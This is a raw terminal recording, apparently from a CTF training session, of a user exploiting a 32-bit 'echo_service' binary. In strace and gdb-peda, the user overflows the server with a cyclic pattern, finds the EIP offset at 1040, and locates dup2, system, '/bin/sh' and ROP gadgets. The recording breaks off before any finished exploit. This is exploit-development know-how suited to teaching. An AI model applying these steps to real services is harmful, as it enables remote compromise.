@@ -1,0 +1,525 @@
+Script started on Sat 25 Jul 2015 12:25:34 AM EEST
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ strace -e [K[K[K[K[K[K[K[K[K[Kstrace -e net[K[K[Ktrace=network ./echo_service 7000
+[ Process PID=19464 runs in 32 bit mode. ]
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+bind(3, {sa_family=AF_INET, sin_port=htons(7000), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
+listen(3, 5)                            = 0
+accept(3, ^CProcess 19464 detached
+ <detached ...>
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ strace -e trace=network ./echo_service 7000[C[C[C[C[C[C[C[1@ [1@-[1@f
+[ Process PID=19657 runs in 32 bit mode. ]
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+bind(3, {sa_family=AF_INET, sin_port=htons(7000), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
+listen(3, 5)                            = 0
+accept(3, {sa_family=AF_INET, sin_port=htons(39289), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
+Process 19884 attached
+[pid 19657] accept(3,  <unfinished ...>
+[pid 19884] +++ exited with 0 +++
+<... accept resumed> 0xbffff348, [16])  = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=19884, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+accept(3, ^CProcess 19657 detached
+ <detached ...>
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ strace -f -e trace=network ./echo_service 7000[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7P[6P[1@a[1@c[1@c[1@e[1@p[1@t[1@,[C[1@ [1@r[1@e[1P[1P[1P[1@r[1@e[1@a[1@d
+[ Process PID=20460 runs in 32 bit mode. ]
+read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\233\1\0004\0\0\0"..., 512) = 512
+accept(3, {sa_family=AF_INET, sin_port=htons(39480), sin_addr=inet_addr("127.0.0.1")}, [16]) = 4
+Process 20617 attached
+[pid 20460] accept(3,  <unfinished ...>
+[pid 20617] read(4, "anaaremere\n", 4096) = 11
+[pid 20617] +++ exited with 0 +++
+<... accept resumed> 0xbffff348, [16])  = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=20617, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
+accept(3, ^CProcess 20460 detached
+ <detached ...>
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ strace -f -e accept,read ./echo_service 7000[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[C[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1@g[1@d[1@b[C[1@ [1@-[1@q[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+Reading symbols from ./echo_service...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mstart 7000
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x2 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0x19987425 
+[;32mEDX[0m: [;34m0xbffff2f4[0m --> [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mESP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mEIP[0m: [;31m0x804891d[0m (<main+3>:	and    esp,0xfffffff0)[0m
+[m[;32mEFLAGS[0m: 0x246 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;1;31mZERO[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048919 <doprocessing+18>:[;2;34m	ret    [0m
+   0x804891a <main>:[;2m	push   ebp[0m
+   0x804891b <main+1>:[;2m	mov    ebp,esp[0m
+=> 0x804891d <main+3>:[;1;32m	and    esp,0xfffffff0[0m
+   0x8048920 <main+6>:[m	sub    esp,0x60[0m
+   0x8048923 <main+9>:[m	mov    DWORD PTR [esp+0x4c],0x1[0m
+   0x804892b <main+17>:[;31m	cmp    DWORD PTR [ebp+0x8],0x2[0m
+   0x804892f <main+21>:[;33m	je     0x8048952 <main+56>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbffff2c8[0m --> 0x0 [0m
+[m0004| [;34m0xbffff2cc[0m --> [;31m0xb7e12a63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0008| [;34m0xbffff2d0[0m --> 0x2 [0m
+[m0012| [;34m0xbffff2d4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[m0016| [;34m0xbffff2d8[0m --> [;34m0xbffff370[0m --> [;34m0xbffff538[0m ("XDG_VTNR=7")[0m
+[m0020| [;34m0xbffff2dc[0m --> [;31m0xb7fed7da[0m (add    ebx,0x11826)[0m
+[m0024| [;34m0xbffff2e0[0m --> 0x2 [0m
+[m0028| [;34m0xbffff2e4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Temporary breakpoint 1, 0x0804891d in main ()
+[;31mgdb-peda$ [0mpattc 1500
+[m'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%nA%SA%oA%TA%pA%UA%qA%VA%rA%WA%sA%XA%tA%YA%uA%ZA%vA%wA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsnAsSAsoAsTAspAsUAsqAsVAsrAsWAssAsXAstAsYAsuAsZAsvAswAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABnABSABoABTABpABUABqABVABrABWABsABXABtABYABuABZABvABwABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$nA$SA$oA$TA$pA$UA$qA$VA$rA$WA$sA$XA$tA$YA$uA$ZA$vA$wA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACnACSACoACTACpACUACqACVACrACWACsACXACtACYACuACZACvACwACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-'[0m
+[;31mgdb-peda$ [0mc
+Continuing.
+[New process 26535]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 26535]
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0xffffffff 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0xffffffbc 
+[;32mEDX[0m: 0x5dd 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: 0x41256e41 ('An%A')
+[;32mESP[0m: [;34m0xbffff240[0m ("BAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzA"...)
+[;32mEIP[0m: 0x6e41736e ('nsAn')[0m
+[m[;32mEFLAGS[0m: 0x10286 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[;31mInvalid $PC address: 0x6e41736e[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbffff240[0m ("BAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzA"...)[0m
+[m0004| [;34m0xbffff244[0m ("AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%AC"...)[0m
+[m0008| [;34m0xbffff248[0m ("nCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACB"...)[0m
+[m0012| [;34m0xbffff24c[0m ("-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$A"...)[0m
+[m0016| [;34m0xbffff250[0m ("AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$ACnAC"...)[0m
+[m0020| [;34m0xbffff254[0m ("n;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$ACnACCAC-"...)[0m
+[m0024| [;34m0xbffff258[0m (")AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(A"...)[0m
+[m0028| [;34m0xbffff25c[0m ("AnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnnAnSAnoAnTAnpAnUAnqAnVAnrAnWAnsAnXAntAnYAnuAnZAnvAnwAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC"...)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+[mStopped reason: [;31mSIGSEGV[0m[0m
+0x6e41736e in ?? ()
+[;31mgdb-peda$ [0mpattc[Ko nsAn
+[mnsAn found at offset: 1040[0m
+[;31mgdb-peda$ [0mq
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ gdb -q ./echo_service 
+Reading symbols from ./echo_service...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mstart 7000
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x2 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0xb5d535c8 
+[;32mEDX[0m: [;34m0xbffff2f4[0m --> [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mESP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mEIP[0m: [;31m0x804891d[0m (<main+3>:	and    esp,0xfffffff0)[0m
+[m[;32mEFLAGS[0m: 0x246 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;1;31mZERO[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048919 <doprocessing+18>:[;2;34m	ret    [0m
+   0x804891a <main>:[;2m	push   ebp[0m
+   0x804891b <main+1>:[;2m	mov    ebp,esp[0m
+=> 0x804891d <main+3>:[;1;32m	and    esp,0xfffffff0[0m
+   0x8048920 <main+6>:[m	sub    esp,0x60[0m
+   0x8048923 <main+9>:[m	mov    DWORD PTR [esp+0x4c],0x1[0m
+   0x804892b <main+17>:[;31m	cmp    DWORD PTR [ebp+0x8],0x2[0m
+   0x804892f <main+21>:[;33m	je     0x8048952 <main+56>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbffff2c8[0m --> 0x0 [0m
+[m0004| [;34m0xbffff2cc[0m --> [;31m0xb7e12a63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0008| [;34m0xbffff2d0[0m --> 0x2 [0m
+[m0012| [;34m0xbffff2d4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[m0016| [;34m0xbffff2d8[0m --> [;34m0xbffff370[0m --> [;34m0xbffff538[0m ("XDG_VTNR=7")[0m
+[m0020| [;34m0xbffff2dc[0m --> [;31m0xb7fed7da[0m (add    ebx,0x11826)[0m
+[m0024| [;34m0xbffff2e0[0m --> 0x2 [0m
+[m0028| [;34m0xbffff2e4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d1[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Temporary breakpoint 1, 0x0804891d in main ()
+[;31mgdb-peda$ [0minfo address dudp[K[Kp@[K2@plt
+Symbol "dup2@plt" is at 0x80485f0 in a file compiled without debugging.
+[;31mgdb-peda$ [0minfo address dup2@plt[4P@plts@plty@plts@pltt@plte@pltm@plt
+Symbol "system@plt" is at 0x8048670 in a file compiled without debugging.
+[;31mgdb-peda$ [0msearchmem /bin/sh
+[mSearching for '/bin/sh' in: None ranges[0m
+[mFound 1 results, display max 1 items:[0m
+[mlibc : [;32m0xb7f561a9[0m ("/bin/sh")[0m
+[;31mgdb-peda$ [0mdumprop
+[m[;33mWarning: this can be very slow, do not run for large memory range[0m[0m
+[mWriting ROP gadgets to file: echo_service-rop.txt ...[0m
+[m0x8048906: ret[0m
+[m0x804877f: repz ret[0m
+[m0x80487ae: ret 0xeac1[0m
+[m0x8048799: leave; ret[0m
+[m0x8048b6f: pop ebp; ret[0m
+[m0x8048904: dec ecx; ret[0m
+[m0x8048e1c: inc ecx; ret[0m
+[m0x80485c9: pop ebx; ret[0m
+[m0x8048b7f: nop; repz ret[0m
+[m0x8048798: ror cl,1; ret[0m
+[m0x804877e: add dh,bl; ret[0m
+[m0x80487d5: ror cl,cl; ret[0m
+[m0x80487fb: leave; repz ret[0m
+[m0x8048761: sbb al,0x24; ret[0m
+[m0x8048e1b: adc al,0x41; ret[0m
+[m0x8048760: mov ebx,[esp]; ret[0m
+[m0x8048b7e: nop; nop; repz ret[0m
+[m0x8048797: call eax; leave; ret[0m
+[m0x80487d4: call edx; leave; ret[0m
+[m0x80487fa: add ecx,ecx; repz ret[0m
+[m0x8048b6e: pop edi; pop ebp; ret[0m
+[m0x804877d: ja 0x8048781; repz ret[0m
+[m0x80487b6: jne 0x80487ba; repz ret[0m
+[m0x8048796: or bh,bh; ror cl,1; ret[0m
+[m0x804875f: nop; mov ebx,[esp]; ret[0m
+--More--(25/147)q
+[;31mgdb-peda$ [0mdumpropsearchmem /bin/sh[C[C[C[C[C[C[C[C[C[C[10Pdumprop
+[m[;33mWarning: this can be very slow, do not run for large memory range[0m[0m
+[mWriting ROP gadgets to file: echo_service-rop.txt ...[0m
+[m0x8048906: ret[0m
+[m0x804877f: repz ret[0m
+[m0x80487ae: ret 0xeac1[0m
+[m0x8048799: leave; ret[0m
+[m0x8048b6f: pop ebp; ret[0m
+[m0x8048904: dec ecx; ret[0m
+[m0x8048e1c: inc ecx; ret[0m
+[m0x80485c9: pop ebx; ret[0m
+[m0x8048b7f: nop; repz ret[0m
+[m0x8048798: ror cl,1; ret[0m
+[m0x804877e: add dh,bl; ret[0m
+[m0x80487d5: ror cl,cl; ret[0m
+[m0x80487fb: leave; repz ret[0m
+[m0x8048761: sbb al,0x24; ret[0m
+[m0x8048e1b: adc al,0x41; ret[0m
+[m0x8048760: mov ebx,[esp]; ret[0m
+[m0x8048b7e: nop; nop; repz ret[0m
+[m0x8048797: call eax; leave; ret[0m
+[m0x80487d4: call edx; leave; ret[0m
+[m0x80487fa: add ecx,ecx; repz ret[0m
+[m0x8048b6e: pop edi; pop ebp; ret[0m
+[m0x804877d: ja 0x8048781; repz ret[0m
+[m0x80487b6: jne 0x80487ba; repz ret[0m
+[m0x8048796: or bh,bh; ror cl,1; ret[0m
+[m0x804875f: nop; mov ebx,[esp]; ret[0m
+--More--(25/147)
+[m0x8048b7d: nop; nop; nop; repz ret[0m
+[m0x80487d3: or bh,bh; ror cl,cl; ret[0m
+[m0x80485c6: add esp,0x8; pop ebx; ret[0m
+[m0x8048e1a: push cs; adc al,0x41; ret[0m
+[m0x8048849: hlt; call eax; leave; ret[0m
+[m0x80485c7: les ecx,[eax]; pop ebx; ret[0m
+[m0x80487f9: or [ecx],al; leave; repz ret[0m
+[m0x80487b5: clc; jne 0x80487ba; repz ret[0m
+[m0x8048b7c: nop; nop; nop; nop; repz ret[0m
+[m0x8048793: push 0xff0804a0; ror cl,1; ret[0m
+[m0x804875e: xchg ax,ax; mov ebx,[esp]; ret[0m
+[m0x8048b6d: pop esi; pop edi; pop ebp; ret[0m
+[m0x80487f7: mov al,ds:0xc9010804; repz ret[0m
+[m0x804877c: push es; ja 0x8048781; repz ret[0m
+[m0x8048779: or [ebx+0x27706f8],al; repz ret[0m
+[m0x80487d0: push 0xff0804a0; ror cl,cl; ret[0m
+[m0x80487f6: push 0x10804a0; leave; repz ret[0m
+[m0x8048795: add al,0x8; call eax; leave; ret[0m
+[m0x80487d1: mov al,ds:0xd2ff0804; leave; ret[0m
+[m0x8048794: mov al,ds:0xd0ff0804; leave; ret[0m
+[m0x80487d2: add al,0x8; call edx; leave; ret[0m
+[m0x80487f8: add al,0x8; add ecx,ecx; repz ret[0m
+[m0x8048b7b: nop; nop; nop; nop; nop; repz ret[0m
+[m0x8048848: inc ebp; hlt; call eax; leave; ret[0m
+[m0x80487b4: sar eax,1; jne 0x80487ba; repz ret[0m
+--More--(50/147)q
+[;31mgdb-peda$ [0mq
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ gdb -q ./echo_service strace -f -e accept,read ./echo_service 7000[2@trace=network[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[3P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[3@f -[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[2Paccept,read[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[22Pgdb -q ./echo_service [Kldd ehc[K[Kcho_service
+	linux-gate.so.1 (0xb7ffd000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e19000)
+	/lib/ld-linux.so.2 (0x41000000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xb7ffd000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e19000)
+	/lib/ld-linux.so.2 (0x41000000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ ldd echo_service
+	linux-gate.so.1 (0xb7ffd000)
+	libc.so.6 => /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e19000)
+	/lib/ld-linux.so.2 (0x41000000)
+]0;razvan@einherjar: ~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-servicerazvan@einherjar:~/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service$ gf[Kd [Kb -q echo_se[K[K[K[K[K[K[K./echo_sef[Krvice
+Reading symbols from ./echo_service...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mstart
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0x494afb7c 
+[;32mEDX[0m: [;34m0xbffff2f4[0m --> [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mESP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mEIP[0m: [;31m0x804891d[0m (<main+3>:	and    esp,0xfffffff0)[0m
+[m[;32mEFLAGS[0m: 0x246 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;1;31mZERO[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048919 <doprocessing+18>:[;2;34m	ret    [0m
+   0x804891a <main>:[;2m	push   ebp[0m
+   0x804891b <main+1>:[;2m	mov    ebp,esp[0m
+=> 0x804891d <main+3>:[;1;32m	and    esp,0xfffffff0[0m
+   0x8048920 <main+6>:[m	sub    esp,0x60[0m
+   0x8048923 <main+9>:[m	mov    DWORD PTR [esp+0x4c],0x1[0m
+   0x804892b <main+17>:[;31m	cmp    DWORD PTR [ebp+0x8],0x2[0m
+   0x804892f <main+21>:[;33m	je     0x8048952 <main+56>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xbffff2c8[0m --> 0x0 [0m
+[m0004| [;34m0xbffff2cc[0m --> [;31m0xb7e12a63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0008| [;34m0xbffff2d0[0m --> 0x1 [0m
+[m0012| [;34m0xbffff2d4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d6[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[m0016| [;34m0xbffff2d8[0m --> [;34m0xbffff36c[0m --> [;34m0xbffff538[0m ("XDG_VTNR=7")[0m
+[m0020| [;34m0xbffff2dc[0m --> [;31m0xb7fed7da[0m (add    ebx,0x11826)[0m
+[m0024| [;34m0xbffff2e0[0m --> 0x1 [0m
+[m0028| [;34m0xbffff2e4[0m --> [;34m0xbffff364[0m --> [;34m0xbffff4d6[0m ("/home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Temporary breakpoint 1, 0x0804891d in main ()
+[;31mgdb-peda$ [0mb echo[K[K[K[K[K[Kset folo[Klow-fork-mode child
+[;31mgdb-peda$ [0mb echo_service 
+Breakpoint 2 at 0x8048857
+[;31mgdb-peda$ [0mc
+Continuing.
+Usage: /home/razvan/projects/ctf/sss/summerschool2014.git/sessions/sess-12/sol/echo-service/echo_service <port>
+[Inferior 1 (process 7356) exited normally]
+[m[;33mWarning: not running or target is remote[0m[0m
+[;31mgdb-peda$ [0mcb echo_service [C[C[C[C[C[C[C[C[C[Cset follow-fork-mode child[C[C[C[C[C[C[C[C[C[C[Ctart[K 7000
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x2 
+[;32mEBX[0m: [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mECX[0m: 0xb24c7e24 
+[;32mEDX[0m: [;34m0xbffff2f4[0m --> [;34m0xb7f9f000[0m --> 0x1a5da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mESP[0m: [;34m0xbffff2c8[0m --> 0x0 
+[;32mEIP[0m: [;31m0x804891d[0m (<main+3>:	and    esp,0xfffffff0)[0m
+[m[;32mEFLAGS[0m: 0x246 ([;32mcarry[0m [;1;31mPARITY[0m [;32madjust[0m [;1;31mZERO[0m [;32msign[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048919 <doprocessing+18>:[;2;34m	ret    [0m
+   0x804891a <main>:[;2m	push   ebp[0m
+   0x804891b <main+1>:[;2m	mov    ebp,esp[0m
+=> 0x804891d <main+3>:[;1;32m	and    esp,0xfffffff0[0m
+   0x8048920 <main+6>:[m	sub    esp,0x60[0m
+   0x8048923 <main+9>:[m	mov    DWORD PTR [esp+0x4c],0x1[0m
+   0x804892b <main+17>:[;31m	cmp    DWORD PTR [ebp+0x8],0x2[0m
+   0x804892f <main+21>:[;33m	je     0x8048952 <main+56>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
